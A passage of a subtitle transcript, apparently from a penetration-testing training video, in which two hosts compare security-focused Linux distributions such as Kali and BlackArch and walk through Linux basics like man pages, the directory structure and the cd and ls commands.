what.\n\n233\n00:10:44.810 --> 00:10:48.830\nEvery tool under the sun\nis inside of Kali Linux.\n\n234\n00:10:48.830 --> 00:10:51.850\nThey do not skimp, they do not scrounge.\n\n235\n00:10:51.850 --> 00:10:55.087\nIt is,\njust about every time I've thought, wow,\n\n236\n00:10:55.087 --> 00:10:58.342\nI wonder if that scanner\nis in my Kali Linux distru?\n\n237\n00:10:58.342 --> 00:11:01.620\nAnd you do a man, whatever that tool is.\n\n238\n00:11:01.620 --> 00:11:03.810\nThere it is, it's already there.\n\n239\n00:11:03.810 --> 00:11:07.910\nIt's pre-built in, it's pre-baked in, and\nthat's why a lot of people go for it.\n\n240\n00:11:09.040 --> 00:11:11.841\nIf you're coming back into security,\nmaybe you've been out of the game for\n\n241\n00:11:11.841 --> 00:11:13.834\na little while,\nyou might remember it as BackTrack.\n\n242\n00:11:13.834 --> 00:11:16.370\n&gt;&gt; Mm-hm.\n&gt;&gt; That's what it was back in the day,\n\n243\n00:11:16.370 --> 00:11:18.020\nBackTrack 3 and 4 and 5.\n\n244\n00:11:18.020 --> 00:11:21.870\nAnd then it became Kali, or\nKali, whatever you wanna, Kali.\n\n245\n00:11:21.870 --> 00:11:26.035\nIt's fine, I love the Linux community\nwho have flame wars over how things\n\n246\n00:11:26.035 --> 00:11:28.390\nare pronounced, like it matters.\n\n247\n00:11:28.390 --> 00:11:28.970\nIt doesn't.\n\n248\n00:11:28.970 --> 00:11:33.430\nCall it Kali, call it Kali,\ncall it Kali, whatever floats your boat.\n\n249\n00:11:33.430 --> 00:11:34.650\nWe all know what you're talking about.\n\n250\n00:11:34.650 --> 00:11:37.827\nSo I just say Kali for ease of use.\n\n251\n00:11:37.827 --> 00:11:40.269\n&gt;&gt; Works for me.\n&gt;&gt; So let's take a look at my computer\n\n252\n00:11:40.269 --> 00:11:43.330\nreal quick so\nyou see where you can get that.\n\n253\n00:11:43.330 --> 00:11:45.929\nWe have www.kali.org,\nby Offensive Security.\n\n254\n00:11:45.929 --> 00:11:48.980\nThe guys at Offensive Security\nare awesome.\n\n255\n00:11:48.980 --> 00:11:51.270\nThey put together a lot of great stuff.\n\n256\n00:11:51.270 --> 00:11:54.870\nAnd they have even training and\ndocumentation in here for\n\n257\n00:11:54.870 --> 00:11:56.660\nfree, very cool stuff.\n\n258\n00:11:56.660 --> 00:11:59.790\nThis Documentation area is priceless.\n\n259\n00:11:59.790 --> 00:12:00.940\nI love their stuff.\n\n260\n00:12:00.940 --> 00:12:04.304\nBut they actually are the ones behind\nthe whole Kali Linux movement.\n\n261\n00:12:04.304 --> 00:12:07.795\nSo that's where you'll go, so kali.org.\n\n262\n00:12:07.795 --> 00:12:12.010\nAnd let me tell you,\ndownloading this thing, it's a good size.\n\n263\n00:12:12.010 --> 00:12:14.795\nI think it's couple of, like a gig or\na gig and a half, whatever,\n\n264\n00:12:14.795 --> 00:12:17.193\nI can't remember exactly\nthe size of the file offhand.\n\n265\n00:12:17.193 --> 00:12:20.865\nBut, can run it in a VM, so\nif you don't wanna blow away your desktop,\n\n266\n00:12:20.865 --> 00:12:24.543\njust throw that into whatever\nvirtualization software you like, and\n\n267\n00:12:24.543 --> 00:12:26.190\nuse it as a secondary, right?\n\n268\n00:12:26.190 --> 00:12:28.882\nSo it's a great way to do that,\nplus, you don't have to.\n\n269\n00:12:28.882 --> 00:12:31.640\nYeah, I like doing that,\nto be honest with you.\n\n270\n00:12:31.640 --> 00:12:34.530\nBecause then, if you do something wrong,\nyou just blow away the VM and go,\n\n271\n00:12:34.530 --> 00:12:36.220\nI don't know what you're talking about.\n\n272\n00:12:36.220 --> 00:12:37.639\nNo, I'm kidding,\nyou shouldn't do that, but you could.\n\n273\n00:12:37.639 --> 00:12:39.011\n[LAUGH]\n\n274\n00:12:39.011 --> 00:12:39.782\n&gt;&gt; [LAUGH]\n&gt;&gt; Mike laughs.\n\n275\n00:12:39.782 --> 00:12:43.830\nWe're devious ones around here at ITProTV,\nespecially when it comes to security.\n\n276\n00:12:43.830 --> 00:12:47.680\n&gt;&gt; And I know, as you said,\nOffensive Security, fantastic resource.\n\n277\n00:12:47.680 --> 00:12:52.620\nThey also have some pre-built\nKali VMs that you can download.\n\n278\n00:12:52.620 --> 00:12:57.440\nYou should really get used to installing\na Linux distribution, or running it live.\n\n279\n00:12:57.440 --> 00:12:59.961\nBut also, you could take advantage\nof their pre-built machines.\n\n280\n00:12:59.961 --> 00:13:00.800\n&gt;&gt; Yeah, totally, totally.\n\n281\n00:13:00.800 --> 00:13:02.550\nThey've got, they're a great resource, so\n\n282\n00:13:02.550 --> 00:13:06.200\nkick your feet around on kali.org and\nsee what you find.\n\n283\n00:13:06.200 --> 00:13:10.297\nDefinitely download the VM, especially if\nyou're gonna be following along with us,\n\n284\n00:13:10.297 --> 00:13:11.933\nso that you can use the same tools.\n\n285\n00:13:11.933 --> 00:13:13.930\nIt's basically configured the same way.\n\n286\n00:13:13.930 --> 00:13:16.460\nNot that the other distributions won't do\nthat, I just can't guarantee that they'll\n\n287\n00:13:16.460 --> 00:13:19.550\nbe there, because I'm using Kali for\nthe show.\n\n288\n00:13:19.550 --> 00:13:20.680\nSpeaking of, the other tools.\n\n289\n00:13:20.680 --> 00:13:24.380\n&gt;&gt; Yeah, I was gonna say, now, we\nobviously are maybe a little bit partial.\n\n290\n00:13:24.380 --> 00:13:27.700\nBut there are other Linux distributions\nthat are geared for this as well.\n\n291\n00:13:27.700 --> 00:13:29.806\n&gt;&gt; Yeah, totally,\nthey're not the only fish in the sea.\n\n292\n00:13:29.806 --> 00:13:32.691\nSo if Kali is not your thing, maybe you\nwant something else you wanna try, or\n\n293\n00:13:32.691 --> 00:13:33.876\nyou just wanna try the others.\n\n294\n00:13:33.876 --> 00:13:35.540\nI know I do.\n\n295\n00:13:35.540 --> 00:13:36.120\nI like to play.\n\n296\n00:13:36.120 --> 00:13:37.408\nI like to see what they'll do.\n\n297\n00:13:37.408 --> 00:13:42.256\nThat's really the mindset that you have to\nhave when it comes to, let's be honest,\n\n298\n00:13:42.256 --> 00:13:44.527\nhacking, that's what we're doing.\n\n299\n00:13:44.527 --> 00:13:46.190\nWe're gonna be hacking computers.\n\n300\n00:13:46.190 --> 00:13:46.950\nYou are a hacker.\n\n301\n00:13:46.950 --> 00:13:50.220\nIf you are into this, you're a hacker,\nthat's the way you think.\n\n302\n00:13:50.220 --> 00:13:53.692\nAnd if you are a hacker,\nthat's exactly what you're gonna be doing.\n\n303\n00:13:53.692 --> 00:13:56.290\nYou wanna play with any new thing\nthat comes down the pipe and\n\n304\n00:13:56.290 --> 00:13:57.080\nsee what you can do with it.\n\n305\n00:13:57.080 --> 00:14:01.080\nSee what it's supposed to do, see what you\ncan make it do, that's the whole idea.\n\n306\n00:14:01.080 --> 00:14:06.430\nSo don't dismiss these just because\nthey're not the one that's used mostly.\n\n307\n00:14:06.430 --> 00:14:08.090\nDownload it, maybe you'll be like, man!\n\n308\n00:14:09.160 --> 00:14:10.980\nSo the next one is BlackArch, right?\n\n309\n00:14:10.980 --> 00:14:12.900\nBlackArch, it's an Arch Linux.\n\n310\n00:14:12.900 --> 00:14:16.890\nIf you like Arch Linux,\nmaybe BlackArch is your way to go.\n\n311\n00:14:16.890 --> 00:14:20.080\nIt's a specific pen testing\ndistribution with a bunch of pre-built\n\n312\n00:14:20.080 --> 00:14:24.470\ntools already baked in,\nso that you can use that.\n\n313\n00:14:24.470 --> 00:14:27.160\nAnd you're an Arch Linux guy,\nnot a problem.\n\n314\n00:14:27.160 --> 00:14:29.790\nLet's check out their resources just\nto see what they're offering here.\n\n315\n00:14:29.790 --> 00:14:33.730\nLet's do a little Google search for\nBlackArch Linux.\n\n316\n00:14:33.730 --> 00:14:37.509\nThere we go, there we go, blackarch.org.\n\n317\n00:14:37.509 --> 00:14:40.595\nAnd of course I'm getting this\nSecure Connection Failed.\n\n318\n00:14:40.595 --> 00:14:42.173\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why.\n\n319\n00:14:42.173 --> 00:14:46.190\nLet's just try again and\nsee if it gives me an error.\n\n320\n00:14:46.190 --> 00:14:49.208\nYeah, maybe I can go to their\ncached page and get around this.\n\n321\n00:14:49.208 --> 00:14:53.537\nThere we go, there we go,\na little defunct-looking there, but\n\n322\n00:14:53.537 --> 00:14:55.044\nwhatever, it works.\n\n323\n00:14:55.044 --> 00:14:59.130\nI'm just trying to initiate you to what\nis out there and available for you.\n\n324\n00:14:59.130 --> 00:15:03.802\nSo there you go, you can, I like this,\nhas a different front end, so\n\n325\n00:15:03.802 --> 00:15:09.540\nflexbox, openbox, lxdm, very cool,\na lot of information around here.\n\n326\n00:15:09.540 --> 00:15:11.631\nI don't know why I'm getting\na security problem with this,\n\n327\n00:15:11.631 --> 00:15:13.897\nbut maybe their security\ncertificate's expired or something.\n\n328\n00:15:13.897 --> 00:15:15.240\n&gt;&gt; Probably.\n\n329\n00:15:15.240 --> 00:15:17.170\n&gt;&gt; That does happen from time to time.\n\n330\n00:15:17.170 --> 00:15:18.620\nAnyway, yeah, check out BlackArch.\n\n331\n00:15:18.620 --> 00:15:21.100\nSo if you're an Arch Linux fan,\nthere's BlackArch.\n\n332\n00:15:21.100 --> 00:15:26.570\nThere's also Black Box and\nFedora Security Spin.\n\n333\n00:15:26.570 --> 00:15:27.444\n&gt;&gt; Hm.\n&gt;&gt; All right, so Fedora,\n\n334\n00:15:27.444 --> 00:15:28.798\nthey're throwing their hat in the ring.\n\n335\n00:15:28.798 --> 00:15:30.183\n&gt;&gt; [LAUGH]\n&gt;&gt; [SOUND], right?\n\n336\n00:15:30.183 --> 00:15:32.270\nPun intended.\n\n337\n00:15:32.270 --> 00:15:35.050\nWith the penetration testing, because\nthey realized there are people out there,\n\n338\n00:15:35.050 --> 00:15:35.930\nand guess what?\n\n339\n00:15:35.930 --> 00:15:39.330\nThey run Red Hat Enterprise Linux,\nand they go.\n\n340\n00:15:39.330 --> 00:15:40.300\nOr they're running Fedora,\n\n341\n00:15:40.300 --> 00:15:44.590\nbecause that Fedora is like their\nbleeding edge version of Red Hat.\n\n342\n00:15:45.770 --> 00:15:48.220\nAnd I wanna use that, and\nI wanna have every tool installed.\n\n343\n00:15:48.220 --> 00:15:51.830\nI wanna be prepared to do some\npen testing in my environment.\n\n344\n00:15:51.830 --> 00:15:53.847\nAnd I don't wanna have to,\ncuz let me tell you what, I've done it.\n\n345\n00:15:53.847 --> 00:15:56.662\nI've multiple times, typically,\n\n346\n00:15:56.662 --> 00:16:01.486\nmy Linux distributions become\npenetration testing systems.\n\n347\n00:16:01.486 --> 00:16:06.177\nBecause I used the tools that are built\nin for administrative purposes, right?\n\n348\n00:16:07.200 --> 00:16:11.830\nJust because a tool is a hacker tool\nper se, typically, that's not the case.\n\n349\n00:16:11.830 --> 00:16:14.620\nTypically, the tool is\nmeant to be administrative.\n\n350\n00:16:14.620 --> 00:16:20.601\nAnd you can use it to do things that would\nlead you down the road to the dark side.\n\n351\n00:16:20.601 --> 00:16:22.435\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] So, and\n\n352\n00:16:22.435 --> 00:16:23.790\nthat's what happens, right?\n\n353\n00:16:23.790 --> 00:16:25.400\nnmaps is a fantastic example.\n\n354\n00:16:25.400 --> 00:16:26.840\nWe'll talk about nmap a little more.\n\n355\n00:16:26.840 --> 00:16:28.920\nJust meant to map networks out.\n\n356\n00:16:28.920 --> 00:16:32.144\nWell, what's on my network,\nwhere the hell, let's do some of that.\n\n357\n00:16:32.144 --> 00:16:35.234\nAnd then someone said, it tells me what\nmachines are on this network, what they\n\n358\n00:16:35.234 --> 00:16:38.385\nare, what they're doing, what services\nthey're, okay, that sounds good to me.\n\n359\n00:16:38.385 --> 00:16:40.400\nIt's all about information, right?\n\n360\n00:16:40.400 --> 00:16:41.290\nSo, there you go.\n\n361\n00:16:41.290 --> 00:16:42.789\nThat's the kind of thing that happens.\n\n362\n00:16:42.789 --> 00:16:45.350\nLet's, to be fair to\nthe other distributions,\n\n363\n00:16:45.350 --> 00:16:47.290\nwe'll go to their websites as well.\n\n364\n00:16:47.290 --> 00:16:49.860\nLet's look up Fedora cuz\nI'm interested in that.\n\n365\n00:16:49.860 --> 00:16:50.778\nI haven't played with it yet.\n\n366\n00:16:50.778 --> 00:16:55.690\nFedora security spin.\n\n367\n00:16:55.690 --> 00:16:57.842\nThere it is.\nSecurity lab, Fedora,\n\n368\n00:16:57.842 --> 00:16:59.934\nI think this is probably it.\n\n369\n00:16:59.934 --> 00:17:00.640\nThere we go.\n\n370\n00:17:00.640 --> 00:17:04.554\nProvides a safe test environment to work\non security auditing, forensics, and\n\n371\n00:17:04.554 --> 00:17:08.421\nsystem rescue and teaching security\ntesting methodologies in universities.\n\n372\n00:17:08.421 --> 00:17:11.490\nSo look at that,\nit's used by higher learning, all that.\n\n373\n00:17:11.490 --> 00:17:13.910\nEverybody isn't,\nthere you big fat download button.\n\n374\n00:17:13.910 --> 00:17:15.900\nClick that download and\nget it operated, right?\n\n375\n00:17:15.900 --> 00:17:17.230\nVery cool.\n\n376\n00:17:17.230 --> 00:17:21.219\nAnd then, of course, we'll do black box\nas well just to see what that looks like.\n\n377\n00:17:21.219 --> 00:17:22.740\nBlackbox Linux.\n\n378\n00:17:24.980 --> 00:17:28.180\nThere we go, a free open source\ncommunity project, how about that.\n\n379\n00:17:28.180 --> 00:17:30.460\nIt's a nice website they got here.\n\n380\n00:17:31.570 --> 00:17:32.582\nWhat is it?\n\n381\n00:17:32.582 --> 00:17:33.520\nMore than operating system,\n\n382\n00:17:33.520 --> 00:17:37.390\na free open source community project aimed\nto promote the culture of security and IT.\n\n383\n00:17:37.390 --> 00:17:41.100\nSo, definitely download all of these,\nI would say.\n\n384\n00:17:41.100 --> 00:17:44.480\nRun them in a VM, see how you like it,\ntake them for a test drive.\n\n385\n00:17:44.480 --> 00:17:45.420\nAnd pick the one you like the best.\n\n386\n00:17:45.420 --> 00:17:48.940\nIf you're following along with me, again,\nI can't guarantee any of the other threes.\n\n387\n00:17:48.940 --> 00:17:53.660\nThen, Cali will work it or\nhave the tool installed, should I say?\n\n388\n00:17:53.660 --> 00:17:57.320\nBut you can fix that by\ninstalling that tool yourself.\n\n389\n00:17:57.320 --> 00:17:58.380\nSo let's move on.\n\n390\n00:17:58.380 --> 00:17:59.040\nWhere are we at?\n\n391\n00:17:59.040 --> 00:18:01.118\nLet's talk Linux basics.\n\n392\n00:18:01.118 --> 00:18:05.490\nSo I'm gonna give you just a hint of\na primer, if it were on the Linux.\n\n393\n00:18:05.490 --> 00:18:09.910\nNot how to do them necessarily,\nbut what you should know so\n\n394\n00:18:09.910 --> 00:18:11.800\nthat we can continue on.\n\n395\n00:18:11.800 --> 00:18:13.710\nThat's the disclaimer here.\n\n396\n00:18:13.710 --> 00:18:16.000\nThis is things that you\nshould be able to do.\n\n397\n00:18:17.030 --> 00:18:18.611\nSo that you can be\nan effective pen tester.\n\n398\n00:18:18.611 --> 00:18:22.924\n&gt;&gt; So in other words, as we go through\nthese, this might be a good time to watch\n\n399\n00:18:22.924 --> 00:18:27.460\nthis, and if any these you're not\nfamiliar with or can't do easily, pause.\n\n400\n00:18:27.460 --> 00:18:30.310\nTake a minute and\nbrush up on those skills.\n\n401\n00:18:30.310 --> 00:18:34.560\nCuz as we go through these episodes, we're\njust gonna be assuming that you understand\n\n402\n00:18:34.560 --> 00:18:36.520\nhow to grip something,\nhow to set something.\n\n403\n00:18:36.520 --> 00:18:38.993\n&gt;&gt; Yeah, Mike,\nagain gold star over here, right?\n\n404\n00:18:38.993 --> 00:18:42.596\nHe's a mastermind, he knows, because\nhe's kind of been through it once or\n\n405\n00:18:42.596 --> 00:18:45.316\ntwice his own self that you\ngot to have a good foundation.\n\n406\n00:18:45.316 --> 00:18:47.606\nIf you're gonna work on\nan operating system,\n\n407\n00:18:47.606 --> 00:18:51.247\nespecially doing something as complex\nas security testing, well hell,\n\n408\n00:18:51.247 --> 00:18:54.960\nyou probably better have a pretty\ngood mind of what's behind the wheel.\n\n409\n00:18:54.960 --> 00:18:57.857\nSo that's what I wanna make sure\nthat you guys are aware of, so\n\n410\n00:18:57.857 --> 00:19:01.645\nif you're weak on any of these one things,\nread the man page, go to the website,\n\n411\n00:19:01.645 --> 00:19:04.568\nwhatever the case is, and\nlearn that at least functionally.\n\n412\n00:19:04.568 --> 00:19:07.731\nAt least be able to get to the man page,\nto be honest with you, and, well,\n\n413\n00:19:07.731 --> 00:19:09.030\nlet's start there.\n\n414\n00:19:09.030 --> 00:19:11.484\nKnow how to do a man page manual, right?\n\n415\n00:19:11.484 --> 00:19:13.190\nThe manual four.\n\n416\n00:19:13.190 --> 00:19:14.900\nIf you have a tool,\nyou don't know how it works,\n\n417\n00:19:14.900 --> 00:19:17.480\nthere's usually a manual installed for it.\n\n418\n00:19:17.480 --> 00:19:20.780\nSo you just do man tool name,\nand something comes up.\n\n419\n00:19:20.780 --> 00:19:22.136\nLet's show you what that looks like,\nright?\n\n420\n00:19:22.136 --> 00:19:23.130\nReally quickly.\n\n421\n00:19:23.130 --> 00:19:25.730\nGot my little command line open here.\n\n422\n00:19:25.730 --> 00:19:28.307\nAll I have to do is do man like DIRB,\nright?\n\n423\n00:19:29.640 --> 00:19:32.040\nDIRB is a Web Content Scanner.\n\n424\n00:19:32.040 --> 00:19:34.540\nIf I never knew how to\nuse DIRB in my life,\n\n425\n00:19:34.540 --> 00:19:36.190\nthere's the manual for it, right there.\n\n426\n00:19:36.190 --> 00:19:43.310\nTypically, you can also kind of do like\na help thing, where you do like dirb-help.\n\n427\n00:19:43.310 --> 00:19:45.991\nI actually know that dirb does not have\na help file, to be honest with you,\n\n428\n00:19:45.991 --> 00:19:47.563\n[LAUGH] you'll see that\nit just goes crazy.\n\n429\n00:19:47.563 --> 00:19:51.700\nIt says fatal, you're gonna die\nbecause I didn't do anything.\n\n430\n00:19:51.700 --> 00:19:52.780\nBut no, you're not gonna die.\n\n431\n00:19:52.780 --> 00:19:54.980\nIt's just letting you know,\nthere is no help file.\n\n432\n00:19:54.980 --> 00:19:57.010\nThe man file is the help file for dirb.\n\n433\n00:19:57.010 --> 00:20:02.875\nBut any other thing, man, nmap,\nor I can just do nmap--help.\n\n434\n00:20:02.875 --> 00:20:04.290\nYou see, it gives you help.\n\n435\n00:20:04.290 --> 00:20:06.220\nRight?\nSo, let me clear that screen out.\n\n436\n00:20:07.430 --> 00:20:09.030\nLet's see here.\n\n437\n00:20:09.030 --> 00:20:11.180\nFile structure and directory traversal.\n\n438\n00:20:11.180 --> 00:20:12.035\nThis is basic stuff, right?\n\n439\n00:20:12.035 --> 00:20:13.660\nLinux 101.\n\n440\n00:20:13.660 --> 00:20:16.910\nWhat's in the file, where are things?\n\n441\n00:20:16.910 --> 00:20:17.775\nDefinitely got to know that.\n\n442\n00:20:17.775 --> 00:20:20.120\nYou got to know you're way\naround Linux pretty well.\n\n443\n00:20:20.120 --> 00:20:21.630\nWhere do I keep all my executables?\n\n444\n00:20:21.630 --> 00:20:24.560\nWhere are my games so I can play\nSolitaire when I'm not doing anything or\n\n445\n00:20:24.560 --> 00:20:25.990\nI'm waiting for a scan to complete?\n\n446\n00:20:25.990 --> 00:20:27.710\nThat's extremely important.\n\n447\n00:20:27.710 --> 00:20:28.390\nYeah, absolutely.\n\n448\n00:20:28.390 --> 00:20:30.631\nIf you don't know that,\nthat's the first thing you should learn.\n\n449\n00:20:30.631 --> 00:20:33.213\nWhere the heck are my games, right?\n\n450\n00:20:33.213 --> 00:20:35.790\n[LAUGH] So let's take a look at\nthe final structure really quickly.\n\n451\n00:20:35.790 --> 00:20:39.750\nIf I do a cd..back to the,\nactually a cd /, like that.\n\n452\n00:20:39.750 --> 00:20:41.524\nSlash is the root system, right?\n\n453\n00:20:41.524 --> 00:20:44.270\nThe top of the tree,\nthe hierarchy as it were.\n\n454\n00:20:44.270 --> 00:20:47.510\nEven though it's kinda weird,\nit's a root, I think bottom.\n\n455\n00:20:47.510 --> 00:20:49.395\nAnyway, so where It all begins, right?\n\n456\n00:20:49.395 --> 00:20:54.364\nAnd if I do an ls to list the directories,\nor if I do an ls- la, like that,\n\n457\n00:20:54.364 --> 00:20:59.667\nyou can start to see some more information\nabout it and basically list it out.\n\n458\n00:20:59.667 --> 00:21:03.572\nA lot of times I'll make an alias for\nls, to be honest with you,\n\n459\n00:21:03.572 --> 00:21:07.190\nbecause a lot of times you\nwant this information.\n\n460\n00:21:07.190 --> 00:21:09.210\nSo it's just easier to make an alias,\n\n461\n00:21:09.210 --> 00:21:13.507\nsay alias equals ls, equals whatever,\nmake it do what you wanna do.\n\n462\n00:21:14.980 --> 00:21:17.460\nBut this is our basic\nLinux directory structure.\n\n463\n00:21:17.460 --> 00:21:19.150\nYou need to know things like var.\n\n464\n00:21:20.285 --> 00:21:22.890\nThat's where logs are capture inside var,\nso\n\n465\n00:21:22.890 --> 00:21:27.890\nthere's var log, that's where Apache,\nif you're running Apache as a web server.\n\n466\n00:21:27.890 --> 00:21:33.365\nThat's where its webroot is,\nwhere you put your index.html,\n\n467\n00:21:33.365 --> 00:21:39.570\nso that when you go to mycoolwebsite.com,\nor whatever it is you wanna call it, and\n\n468\n00:21:39.570 --> 00:21:44.100\nit shows you that first page, that's\nwhere it goes, so you got to know that.\n\n469\n00:21:44.100 --> 00:21:45.665\nMike, what's some other good ones?\n\n470\n00:21:45.665 --> 00:21:46.412\n[LAUGH].\n\n471\n00:21:46.412 --> 00:21:46.923\n&gt;&gt; You ask me.\n\n472\n00:21:46.923 --> 00:21:48.400\nUSR, I think.\n\n473\n00:21:48.400 --> 00:21:48.931\n&gt;&gt; Yeah.\n\n474\n00:21:48.931 --> 00:21:51.160\nAnd then those Bin folders are important.\n\n475\n00:21:51.160 --> 00:21:52.250\n&gt;&gt; Yeah, Bin is great, right?\n\n476\n00:21:52.250 --> 00:21:53.345\nBin is where all your binaries are.\n\n477\n00:21:53.345 --> 00:21:54.450\nThere is sbin.\n\n478\n00:21:54.450 --> 00:21:55.020\nThere is bin.\n\n479\n00:21:55.020 --> 00:21:58.310\nThere's /usr/local/bin.\n\n480\n00:21:58.310 --> 00:22:01.260\n/usr/local/sbin, /usr/bin, /usr/sbin.\n\n481\n00:22:01.260 --> 00:22:03.080\nThere's a lot of them around there.\n\n482\n00:22:03.080 --> 00:22:06.610\nTypically though, like sbin and\nbin are the main ones, and\n\n483\n00:22:06.610 --> 00:22:10.580\nthose user local ones are gonna be-\n&gt;&gt; I found it as a primarily a Windows\n\n484\n00:22:10.580 --> 00:22:14.730\nguy, I found this was one of the biggest\nhurdles that I had to face was\n\n485\n00:22:14.730 --> 00:22:16.480\ngetting comfortable with the file system,\n\n486\n00:22:16.480 --> 00:22:19.420\nknowing where things are gonna be put,\nwhere to expect them.\n\n487\n00:22:19.420 --> 00:22:23.470\nSo do spend a little time here, because\nit will make your life in the Linux world\n\n488\n00:22:23.470 --> 00:22:28.500\na whole lot easier If you understand\nthe way that file system is structured and\n\n489\n00:22:28.500 --> 00:22:30.160\nwhere it's putting things.\n\n490\n00:22:30.160 --> 00:22:32.390\n&gt;&gt; Yeah.\n&gt;&gt; And understanding where you're at\n\n491\n00:22:32.390 --> 00:22:35.030\nin the file system, unlike say,\nFile Explorer in Windows,\n\n492\n00:22:35.030 --> 00:22:38.040\nwhere it's very obvious and\nyou get that path up there.\n\n493\n00:22:38.040 --> 00:22:41.159\nSometimes in Linux it can be a little more\ndifficult to figure out where you are.\n\n494\n00:22:41.159 --> 00:22:41.741\n&gt;&gt; Yeah.\n\n495\n00:22:41.741 --> 00:22:43.216\nThere are graphical sides to this thing.\n\n496\n00:22:43.216 --> 00:22:47.778\nAll right, there's a file explorer\nhere that I could fire up and that,\n\n497\n00:22:47.778 --> 00:22:48.700\nthere you go.\n\n498\n00:22:48.700 --> 00:22:51.730\nThere's a little more Windows E,\nso that can be helpful.\n\n499\n00:22:51.730 --> 00:22:54.020\nYou'll notice I'm in my Home Directory.\n\n500\n00:22:54.020 --> 00:22:55.774\nWhat's my Home Directory?\n\n501\n00:22:55.774 --> 00:22:56.958\nAll right, see, gotcha.\n\n502\n00:22:56.958 --> 00:23:00.470\nYou got to know a little more about\nLinux cuz they assume some knowledge.\n\n503\n00:23:00.470 --> 00:23:02.830\nSo, let's talk about the home\ndirectory really quickly.\n\n504\n00:23:02.830 --> 00:23:03.460\nYeah, that's a good one.\n\n505\n00:23:05.650 --> 00:23:09.210\nWhere is /home, there you are, /home.\n\n506\n00:23:09.210 --> 00:23:11.780\nThat's typically if you\nhave a user on a system.\n\n507\n00:23:11.780 --> 00:23:14.290\nThey get their own directory, so\nthey could place their own files.\n\n508\n00:23:14.290 --> 00:23:15.240\nJust like you do on Windows.\n\n509\n00:23:15.240 --> 00:23:16.810\nYou have a profile or whatever.\n\n510\n00:23:16.810 --> 00:23:17.650\nSame kind of idea.\n\n511\n00:23:18.780 --> 00:23:20.438\nCuz they're gonna be on a /home directory.\n\n512\n00:23:20.438 --> 00:23:23.960\nSo if you got multiple users,\nyou know that their home directory's gonna\n\n513\n00:23:23.960 --> 00:23:28.265\nbe in /home/mrodrick/dlowrie/kittenface,\n\n514\n00:23:28.265 --> 00:23:31.070\nor whatever you're called\non your Linux distribution.\n\n515\n00:23:32.250 --> 00:23:35.460\nAnother really,\nreally good one is Etsy here.\n\n516\n00:23:35.460 --> 00:23:39.888\nConfiguration files,\nsystem startup scripts, system stuff,\n\n517\n00:23:39.888 --> 00:23:43.679\nspecifically, do I wanna give\naway the ghost just yet?\n\n518\n00:23:43.679 --> 00:23:44.240\n&gt;&gt; Not yet.\n\n519\n00:23:44.240 --> 00:23:45.835\n&gt;&gt; Nah, we'll save that, we'll save that.\n\n520\n00:23:45.835 --> 00:23:48.730\n&gt;&gt; [LAUGH]\n&gt;&gt; Just tease you a little bit, right?\n\n521\n00:23:48.730 --> 00:23:50.155\nSome really good stuff in there, right?\n\n522\n00:23:50.155 --> 00:23:53.232\nSo get comfortable inside of SE,\nyou'll be there a lot.\n\n523\n00:23:53.232 --> 00:23:57.811\nThere was one more I thought was good,\nwhich one was it?\n\n524\n00:23:57.811 --> 00:24:00.741\nHome, the root directory itself, duh.\n\n525\n00:24:00.741 --> 00:24:01.937\nWhere am I?\n\n526\n00:24:01.937 --> 00:24:07.330\n/root, not root, not the root directory,\nbut root's directory.\n\n527\n00:24:07.330 --> 00:24:10.070\nThis is a very, [LAUGH] understand\nthe difference between the two.\n\n528\n00:24:10.070 --> 00:24:13.461\nThat's what you need to know, that /root,\n\n529\n00:24:13.461 --> 00:24:17.580\nnot just /, but /root,\nis root's home directory.\n\n530\n00:24:17.580 --> 00:24:19.073\nIt's not found on the home directory.\n\n531\n00:24:19.073 --> 00:24:22.779\nAnd only root can access it or if you have\nappropriate permissions you can get into\n\n532\n00:24:22.779 --> 00:24:26.560\nthe root file or the root folder,\nthe home directory should I say.\n\n533\n00:24:26.560 --> 00:24:28.820\nSo, yeah, I know,\na little bit of twisties.\n\n534\n00:24:28.820 --> 00:24:32.230\n&gt;&gt; It really is a little bit weird, and\nso let me see if I can decipher that for\n\n535\n00:24:32.230 --> 00:24:33.650\nus Windows people out there.\n\n536\n00:24:33.650 --> 00:24:36.871\nThere's root which is the top\nof the file structure but\n\n537\n00:24:36.871 --> 00:24:41.773\nthen there's also root which is the root\nuser's directory where his documents and\n\n538\n00:24:41.773 --> 00:24:44.938\nthings go to his or her,\nwhoever is logged in as root.\n\n539\n00:24:44.938 --> 00:24:48.965\nSo that's the difference there when you\ntalk about root, you could be talking\n\n540\n00:24:48.965 --> 00:24:53.008\nabout the root of the file system itself,\nor the super user, the super admin.\n\n541\n00:24:53.008 --> 00:24:57.170\nWell, he has a personal directory just\nlike any other user on the system.\n\n542\n00:24:57.170 --> 00:24:59.970\n&gt;&gt; That's it, all right, so\nlet's move through this directory.\n\n543\n00:24:59.970 --> 00:25:01.080\nWhat if I wanted to get in?\n\n544\n00:25:01.080 --> 00:25:03.660\nHow do I get from one\ndirectory to another?\n\n545\n00:25:03.660 --> 00:25:05.210\nReally simple to use the cd.\n\n546\n00:25:05.210 --> 00:25:08.000\nSo if you're coming from a Windows,\nthis should be very similar.\n\n547\n00:25:08.000 --> 00:25:10.800\nA lot of the stuff like\nmaking directories, mkdir,\n\n548\n00:25:10.800 --> 00:25:15.000\nI think that's the same if not\nsimilar in Windows environments.\n\n549\n00:25:15.000 --> 00:25:18.270\nSo if you have some Windows\ncommand line knowledge,\n\n550\n00:25:18.270 --> 00:25:22.080\nyou should be able to take\na lot of that and pump it over.\n\n551\n00:25:22.080 --> 00:25:24.710\nNot all that.\nIt's actually gonna go well beyond,\n\n552\n00:25:24.710 --> 00:25:26.445\nat least the command line portion.\n\n553\n00:25:26.445 --> 00:25:31.520\nPowerScript, or PowerShell and\nmaybe the old VB scripting and\n\n554\n00:25:31.520 --> 00:25:35.590\nstuff is a little more in-depth than\ncommand line inside of Windows.\n\n555\n00:25:35.590 --> 00:25:40.000\nBut For Linux, you just have the command\nline, and it's all right there.\n\n556\n00:25:40.000 --> 00:25:41.560\nIt's all built into that bash environment.\n\n557\n00:25:42.610 --> 00:25:47.420\nSo let's do that, let's just change\ninto cd /home, like that, all right, and\n\n558\n00:25:47.420 --> 00:25:49.790\nnow I'm in the home directory.\n\n559\n00:25:49.790 --> 00:25:50.690\nVery, very simple.\n\n560\n00:25:50.690 --> 00:25:53.720\nIf I wanna back out, cd There you go.\n\n561\n00:25:53.720 --> 00:25:58.250\nI've moved one directory up, or\ndown, or however you think about it.\n\n562\n00:25:58.250 --> 00:26:02.290\nLets go into manipulating output.\n\n563\n00:26:02.290 --> 